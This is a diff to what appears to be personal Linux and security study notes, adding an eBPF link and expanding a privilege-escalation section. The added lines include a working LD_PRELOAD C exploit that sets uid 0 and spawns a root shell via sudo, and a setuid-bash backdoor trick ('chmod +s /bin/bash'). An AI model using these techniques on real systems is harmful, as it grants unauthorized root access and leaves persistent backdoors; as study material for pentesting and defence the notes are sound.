@@ -94,6 +94,7 @@
 
 ### Kernel 
 
+- eBPF is a revolutionary technology that can run sandboxed programs in the Linux kernel without changing kernel source code or loading kernel modules. By making the Linux kernel programmable, infrastructure software can leverage existing layers, making them more intelligent and feature-rich without continuing to add additional layers of complexity to the system.: <https://ebpf.io/>
 - To communicate with the kernel, different UNIX systems use different interfaces
   - <https://opensource.com/article/19/3/virtual-filesystems-linux>
   - Source of VFS: <https://www.tldp.org/LDP/khg/HyperNews/get/fs/vfstour.html>
@@ -729,12 +730,30 @@
     - `cat /sys/class/graphics/fb0/virtual_size`
   - `root`
     - `find / -group root -perm -g=w 2>/dev/null`
-- Hacking Linux Part I: Privilege Escalation: <http://www.dankalia.com/tutor/01005/0100501004.htm>
+- Privilege Escalation: <http://www.dankalia.com/tutor/01005/0100501004.htm>
   - Abusing users with '.' in their PATH
   - Shell Escape Sequences
   - IFS Exploit
   - LD_PRELOAD Exploit
+    - cat /etc/ld.so.conf
+    - cat /etc/ld.so.conf.d/*
+    ```cpp
+    #include <stdio.h>
+    #include <sys/types.h> 
+    #include <stdlib.h>
+    void _init() { 
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+    }
+    // gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+    // sudo LD_PRELOAD=/home/admin/shell.so apache2
+    ```
   - Symlinks
+  - Get root shell from a limited account
+    - From root: `chmod +s /bin/bash`
+    - From limited account: `/bin/bash`
 - Find plain text username / password
     ```bash 
     grep -i user [filename]
